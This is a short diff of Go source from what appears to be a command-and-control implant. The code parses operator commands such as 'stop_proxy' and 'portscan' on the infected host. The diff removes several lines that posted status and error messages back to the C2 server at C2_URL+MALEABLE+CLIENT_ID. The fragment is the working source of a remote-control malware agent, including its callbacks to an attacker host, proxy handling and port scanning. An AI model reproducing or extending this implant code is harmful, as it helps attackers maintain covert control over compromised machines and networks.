@@ -1780,19 +1780,15 @@ func main() {
                         if lazyconf.DebugImplant == "True" {
                             fmt.Println("[ERROR] Invalid stop_proxy command format, expected stop_proxy:<listenAddr>")
                         }
-                        retryRequest(ctx, C2_URL+MALEABLE+CLIENT_ID, "POST", `{"error":"Invalid stop_proxy command format"}`, "")
-                        break
                     }
                     if err := stopProxy(listenAddr, lazyconf); err != nil {
                         if lazyconf.DebugImplant == "True" {
                             fmt.Printf("[ERROR] Failed to stop proxy: %v\n", err)
                         }
-                        retryRequest(ctx, C2_URL+MALEABLE+CLIENT_ID, "POST", fmt.Sprintf(`{"error":"Failed to stop proxy: %v"}`, err), "")
                     } else {
                         if lazyconf.DebugImplant == "True" {
                             fmt.Printf("[INFO] Proxy stopped on %s\n", listenAddr)
                         }
-                        retryRequest(ctx, C2_URL+MALEABLE+CLIENT_ID, "POST", fmt.Sprintf(`{"message":"Proxy stopped on %s"}`, listenAddr), "")
                     }
                 case strings.HasPrefix(command, "portscan:"):
                     timeout := 2 * time.Second
